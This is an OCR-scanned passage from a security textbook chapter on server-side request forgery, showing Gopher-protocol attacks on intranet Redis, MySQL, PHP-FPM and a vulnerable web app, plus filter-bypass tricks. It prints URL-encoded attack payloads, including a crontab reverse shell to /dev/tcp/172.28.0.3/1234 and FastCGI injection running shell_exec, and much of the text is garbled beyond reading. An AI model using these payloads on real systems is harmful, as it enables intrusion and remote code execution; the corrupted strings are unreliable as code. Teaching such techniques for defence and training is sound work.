## Page 105
2.1 SSRF Vulnerabilities
89
5
/05/21 09:55:00.5251901ength+81 frm-# to-
*/1 +** * besh -1 /de/tg/172.8.4.3/124 (1
9/05/21 09:55:00.575257 1ength+5 from8 to4
8/05/21 9:56113.779453 1engh57 fm# to56
/s/ s  s [/
273ko4d /# redisli -9 1234 cnfig set dofi1erue rot
739o8d /]# redlsct1  1234 sare
/]
Fig, 2.6 Execution process
Od° and "n" (a newline) with “%Oa ", where "$" is URL-encoded to give the
following string.
$0a1+0d+0at2456$od+0av0a$0a*/1$20*$20*$20*20bash+20-i$20&gt s$20/
*1$0dt0at248t0dt0aflusha11$0d$0a*3$0dt0at243t0dt0asett0dt0a$241$0d
dev/tcp/172. 28 .0.3/1234$200>&1$0a$0a$0d$0a
0dvodv0a2416vodv0a/vax/spoo1/cron/$od$0a+4vodv0av246vodt0aconfig
$0a*4t0dt0at246t0dt0aconfig$0d$0a$243$0dt0aset$0dt0a$243$0dt0ad1r$
0d odt0a$243$0d$0aset$0d$0a$2410+odt0adbfilename$0d$0a$244$0d$
Daroot+0d+0a*1+odt0a$244$0d$0asave$0dt0a
If you want to change the bounce IP and port directly in this string, you need to
change the preceding “"$56" at the same time, where “56" is the length of the
command written in Crontab. For example, the string would be
d,n^,n*/1 + + + + bash -1 >& /dev/tcp/172 .28 , 0 . 3/1234 0>&1 d\,n^,n
(1+9), 09,  o pu n 01 0 doq   o
The constructed string is filled in for an attack, see Fig. 2.7, and five OKs are
---
## Page 106
90
qPM peouapy 
Fig, 2.7 Execution process
Fig, 2.8 The contents of the
[roote94d68bba5e25 cron]#1s
Crontab
root
redis-bits@ctineoused-memx
redis-ver5.0.5
aof-preamble8
*/1 * * * • bash -1 >& /dev/tcp/172.28.0.3/1234 B>81
yd[roote94d68bba5e25cron]#
returned, corresponding to five commands, and a Crontab has been written on the
target machine, see Fig. 2.8.
Writing Webshell, etc., is the same as writing a file, just modify the directory, file
name, and write the content.
2. Attacking MySQL
To attack MySQL on an intranet, we need to understand its communication pro-
tocols: MySQL is divided into a client and a server, and there are four ways to
connect to the server from the client: UNIX sockets, memory shares, named pipes,
and TCP/IP sockets.
We rely on the fourth method of attack, which occurs when the MySQL client
connects and whether or not password authentication is required. When password
---
## Page 107
2.1 SSRF Vulnerabilities
I6
nds end with :org
Server version: 5.6.44 nySQu Comunity Server (GPL)
opyright (c)20,209,racle and/ritsaffitiates.Allrightsreserved.
racle is a registered trademark of Oracle Corporation and/or its
You can turn off this fesature to get a quicker startup with -A
from user;
1adn
adnin1231
row in set (0.00 sec)
tysql> exit
rootg23c6af996837:/
Fig, 2.9 Log in to the MySQL server
authentication is required, the server sends a salt, and then the client uses the salt to
encrypt the password and authenticate. When password authentication is not
required, packets are sent directly using the fourth method. Therefore, logging in
and operating the MySQL database in non-interactive mode can only be done when
the empty password is not authorized.
Suppose we want to query the user table in the database on the target server. We
first create a new user table locally, then use tcpdump to capture the packets and
write the captured traffic to the file /pcap/mysql.pcap. The command is as follows.
deod· tbsAu/desd/ A- 9occ axod oT - dumpdo1
After starting the packet capture, log in to the MySQL server and perform the
query, as shown in Fig. 2.9.
Then use Wireshark to open the /pcap/mysql.pcap packet, filter the MySQL
packet, select any packet and right-click it, select “Trace Stream  TCP Stream"
 pue as on o o xd o y  nos dndod o uo
adjust the format to the following HEX dumps, see Fig. 2.10.
---
## Page 108
92
2 Advanced Web
4771716
45 40 54 20 44 41 54 41
127.0.0.146308 +1270013300
Fig, 2.10 Mysql log data
The packets are obtained from the client to the server and the complete flow of
commands executed, and then URL-encoded to give the following data.
$a0+00+00+01+85$a6$7f+00$00$00$01$08$00$00400$00$00$00$00$00$00$
00+00+00+00+00$00$00$00$00$00$00$00$00$00$00400400400400$00
$00400400400400400477$65$62$00$00$6d$79$73471$6c$5f$6e461$74$69$
$00+64+03+5f+6f$73$05$4c$69$6e$75$78$0c$5f$63$6ct69$65$6e$74$5f$
76465454470461473473477464$72$64
6e$61$6d$65$086c69$62t6d$79
$73+71$6c404+5f470$69$64$03$31$37$31$04$5f463$6ct69t65$6e874$5$
76$65+72$73$69$6f$6e$06$35$2e
$3642e434434+09$5f470$6c$61$74$66$6f$72$6d4064783836$54$36$34$
0ct70472+6f$67t72t61t6dt5$6e
$61$6d46540546d$79$73$71$6c$21$00800$00$03473$65$6c$65$63$74$20$
40404076t6572$73$69$6f$6e$5f
$63$64$6d+6d+65$6e$74$20$6c$69$6d$69$74$20$31$12$00t00t00$03$53$
45$4c$45$43$54$20$44$41$54$41
$42$41$53$45+28$29$05$00800800802873$73$72466$04$00$00$00803873$
68464477420464$61474$61$62$61
$73$6547340c400400400#03873868864$77$20$74461$62$6c465$738068008
100400403473465$6c165463$74$20$2a42016647246446d420475$73165$72$
00400+0447$73$65$72$00400813$00$00
TO4004004004004TO
---
## Page 109
2.1 SSRF Vulnerabilities
93
ete
Fig, 2.11 Attack result
The attack is performed to obtain the data in the user table, see Fig. 2.11.
3. PHP-FPM attacks
The following conditions are utilized: Libcurl, version 7.45.0 or higher; PHP-FPM,
listening port, version 5.3.3 or higher; and knowing the absolute path of any PHP file
on the server.
PHP-FPM is the process that implements and manages FastCGI If FastCGI mode
is used in PHP-FPM, the communication can be divided into two types: TCP and
UNIX sockets.
In TCP mode, Nginx listens on a local port, the default port number is 9000, and
Nginx passes client data to port 9000 via FastCGI protocol.
The Nginx configuration ile is as follows.
location - \er,phpS 
include /etc/nginx/fastcgi_params;
index index.php index.html index.htm;
fastcgi_index index.php:
fastcgi_pass 127.0.0.1: 9000;
include fastcgi_parans;
The PHP-FPM configuration is shown below.
listen=127.0.0.1:9000
---
## Page 110
6
2 Advanced Web
Since we communicate with PHP-FPM via FastCGI, we can forge the FastCGI
protocol package to execute arbitrary PHP code, which can only transfer configura-
tion information, file names that need to be executed, and client-side data such as
GET, POST, cookies, etc., and then execute arbitrary code by changing the config-
uration information.
There are two handy configuration items in php.ini.
* auto_prepend_file: Contains the file specified in auto_prepend_file before exe-
cuting the target file and can use pseudo-protocols such as php:/input.
• auto_append_file: a file containing the file pointed to by auto_append_file after
executing the target file.
If you set auto_prepend_file to php:/input, each file will contain the POST data
before execution, but php:/input needs to enable allow_url_include. This configu-
ration can only be changed in php.ini, but the PHP_ADMIN_VALUE option in the
FastCGI protocol can be used to change almost any configuration (disable_functions
cannot be changed), and allow_url_include can be changed to True by setting PHP_
ADMIN_VALUE. This allows arbitrary code execution via the FastCGI protocol.
Use the Exploit, which is publicly available online at the following address.
https: //gist . github . com/phith0n/9615e2420f31048f7e30f3937356cf75
You need to know the absolute path of a PHP file on the server because it is
determined to include whether the file exists or not and the security.limit_extensions
configuration item must be followed by .php. Generally, you can use the default /var/
www/html/index.php. If you cannot know the web directory, you can see the list of
files in the default PHP installation. See Fig. 2.12.
The results of the attack using Exploit are shown in Fig. 2.13.
Use nc to listen on a port and get attack traffic. See Fig. 2.14. URL-encoding the
data therein yields.
$01+01+034EP+00+08+00$00$00$00$01$00$00$00$00$00$00$00$00$01$04$
0CV10CONTENT_TYPEapp1ication/text$0B$04RENOTE_PORT9985$0B$
03VEFV01VE7V00V0OV0EV02CONTENT_L&NGTH41
09SERVER_NAMElocalhostV11$0BGATEHAY_
interfacefastCGI/1 . ovoFvoESgRVER_SOFTWAREphp/fcgiclient$OB$
FILENAME/usx/1oca1/1ib/php/P&AR -php$oB$18sCRIPT_NAME/usr/1oca1/
09REMOTE_ADDR127.0 .0 .1%0F$1BSCRIPT_
1ib/php/PEAR php+o9v1FPHP_VALUEa
uto_prepend_fi1e+20v3D$20php$3A//input$0E$04REQUEST_METHODP0ST$0B$
PROTOCOLHTTP/ 1 1VOCV0OQUERY_STRING&0F$
02SERVER_PORT80V0FV08SERVER
16PHP_ADMIN_VALUEa11ov_ur1_inc1ude$20$3D$20Ont0Dt01DoCUME
NT_ROOT/v0BV09SERVER_ADDR127.0.0.1$o8$18REQUEST_URI/usx/1ocal/
0o0+00+o1+05$03+εP$00v29$o0$00$3c$3Fphp$20vax_dump+28she11_exec$
1ib/php/PEAR php$01$04+03$&F$00$0
2827uname20-a272929$3B$3F
$3E$01$05$03$EF$00$00$00$00$00$00
---
## Page 111
2.1 SSRF Vulnerabilities
/usr/local/1ib/php/buid/run-tests.php
oash-4.4f1nd/-
/usr/locat/1.ib/php/doc/XML_utit/examples/example.php
us/ca//p/p
/ust/local/1ib/php/doc/xdebug/contrib/tracefile-analyser.php
/usr/ocat/1ib/php/Structures/Graph/Node.php
/usr/local/Lib/php/Structures/6raph/Manipulator/TopologicalSorter-ph
/usr/local/ib/php/Structures/rah.php
Vusr/ocal/ib/php/PEAR/Config.php
/usr/locat/1ib/php/PEAR/Instatter-php
usr/1oca/1ib/php/PEAR/PackageFile.php
us/ca/b//PEAR/ChaFie/Parr
/usr/local/Lib/php/PEAR/Validate.php
/usr/oca/lb/ph/PEAR/ErrStack.ph
usr/locat/1ib/php/PEAR/RunTest.php
usr/ocal/lb/ph/PEAR/Exception.pp
/usr/local/1ib/php/PEAR/Packager.php
/usr/ca/b/EAR/ChLFi
Fig, 2.12 The list of files in the default PHP installation
r:3-
b-sh-4,4-Dythn/7.35
string(84) *Limux h27e46b05b21 4.9.125-1inuokit #1 S8P Fri Seg 7 88:20:28 UTC 2018 x86_64 Li
Fig, 2.13 Attack result
The results of the attack are shown in Fig. 2.15
4. attacking vulnerable web applications in the intranet
Web applications on intranets tend to ignore security threats because attackers
outside the network cannot access them.
Suppose there is a web application with an arbitrary command execution vulner-
ability in the intranet, with the following code.
Listen locally on any port, and then make a POST request to capture the requested
packet (see Fig. 2.16).
---
## Page 112
96
qPM pzounapy
:127.8.8.1:1234 fro ta/hos5t:3025 [ ::12.0.8.1:325)
line 2,
le*/eip-ag*.Lire 1,isregast
ontet)
/1.trt
45
Fig, 2.14 Attack traffic
Fig, 2.15 Result
The port number of the listener is removed, resulting in the following packet.
Host : 127.0.0.1
POST / HTTP/1 1
---
## Page 113
2.1 SSRF Vulnerabilities
97
root@927e6e11a545:/var/www/html#nc -1vp 1234
listening on[any]1234..
connect to [127.0.0.1] from localhost [127.0.0.1] 33118
POST/ HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: curl/7.52.1
Accept:*/*
Content-Length:16
Content-Type: application/x-www-form-urlencoded
command=ls -la/
Fig, 2.16 Listen locally on any port
User-Agent : cur1/7.52.1
Accept: +/*
Content -Length: 16
Content -Type : application/x-www-fom-urlencoded
command=1s -1a /
Change it to the URL of the Gopher protocol and change the rules as above.
Execute the uname -a command.
POSTt20/v20HTTP/1 .1t0dt0aHost :$20127 .0 .0 .1v0dt0aUser-
Agent : $20cur1/7 . 52 . 1$odt0aAccept :$20+/+$odv0aContent-Length: $
Type : $20app1ication/x-wvw-form-ur1encodedt 0dvoatodv
2016vodv0aContent-
-0z$aueum=pueuwoot0
The results of the aftack are shown in Fig. 2.17.
+Trying 127.a.0.1..
PP/5.6.
nt-Type:text/htnl;cha
et-UTF-8
strig() Lx 927el545 4.9.151kit #1  Fri Sep 7 :20:28 UTC 29# , G/n
Fig, 2.17 Attack result
---
## Page 114
98
qPM pooumapy
GOPlerDS
: 1.50r,1
//127.1.1.1:306/
Fig, 2.18 SSRF tools: Gopherus
2.1.3.3 Automating Gopher Assembly
There are already people who have summarized various protocols and written scripts
for automatic conversions, so there is no need for manual packet capture and
conversion in most cases. The recommended tool, https:/github.comm/tarunkant/
Gopherus, is shown in Fig. 2.18.
2.1.4 SSRF Bypassing
SSRF also has some WAF bypass scenarios, which will be briefly analyzed in this
section.
2.1.4.1 IP Restrictions
Use Enclosed alphanumerics instead of numbers in the IP or letters in the URL (see
Fig. 2.19), or use periods instead of dots (see Fig. 2.20).
If server-side filtering uses regular expressions to filter IP addresses belonging to
the intranet, you can bypass it by convering the IP address to hexadecimal, e.g-
127.0.0.1 to hexadecimal for the request, see Fig. 2.21
The IP address can be converted to decimal, octal, and hexadecimal, respectively
2130706433, 17700000001, and 7F000001. When the request is made after conver-
sion, Ox should be added before hexadecimal, and 0 should be added before octal,
see Fig. 2.22.
---
## Page 115
2.1 SSRF Vulnerabilities
99
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
[roote33e63029d1da /]# p1ng 127.00.①)-c4
64bytesfrom localhost(127.0.6.1):icmp_seq=2ttl=64tine=0.17ms
-127.0.0.1 ping statistics ..
4packets transmitted,4received，0% packet loss,time 3156ms
rtt min/avg/max/mdev=0.067/0.689/0.107/0.821ms
[roote33e63029d1da /]#
Fig, 2.19 Bypass result
INT
 SQL· xSs*Encryption*Enoe
ing' Other
 Lod URL
http:(/127, 0, 0. 1
Split URL
Execute
Eneble Post deta  Enable Referer
echo $res;
Fig, 2.20 Bypass result 
Windows, 0 stands for 0.0.0.0, while under Linux, 0 stands for 127.0.0.1, see
In addition, there are particular ways to write IP addresses. For example, under
Fig. 2.23. So, in some cases, http:/0j进行请求127.0.0.1 can be used. An address
like 127.0.0.1, which has a 0 in the middle, can have 0 Omitted, see Fig. 2.24.
2.1.4.2 302 Redirection
ueopqns aotaias Aue on spoonpau peq xaomau a uo sisixa otdix paeo aotais y
when accessed, such as 127.0.0.1.xip.io, see Fig. 2.25.
---
## Page 116
100
qPM peouapy
Fig, 2.21 Bypass result
[root033e63029d1da cron]# ping 8177e8060001 -c 1
PING 017780068001 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: iomp_seq=1 ttl=64 time=0.096 ms
0177800091 ping statistics -
1packets transmitted,1received, 64 packet loss,time 0ns
rtt min/avg/max/mdev = 0.696/0.896/e.096/0.698 ms
- 
PING 08096001778e906891 (127.0.9.1) 56(84) bytes of data,
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.089 ms
0000000177000001 ping statistics -*
1packets transmitted, 1 received, 6% packet loss, time 0ns
rtt min/avg/max/mdev = 0.689/0.089/0.089/0.600 ms
[roote33e63029d1dacron]
Fig, 2.22 Bypass result
One possible problem with this approach is that there is a keyword 127.0.0.1 in
the incoming URL, which is usually filtered, so we can redirect it to a specific IP
address using a short URL, such as the short URL http:/dwz.cn/11SMa, see
Fig. 2.26.
Jo duu, Xquo 'aduexa aog sjooojoxd Kueu say keu sansas oq saaog
"https" is allowed in the incoming URL, so you can write a 302 redirection on your
server and use the Gopher protocol to aftack the intranet. Redis, see Fig. 2.27.
---
## Page 117
2.1 SSRF Vulnerabilities
101
[roote33e63029d1da cron]#ping -c4
PING 0 (127.0.8.1) 56(84) bytes of data.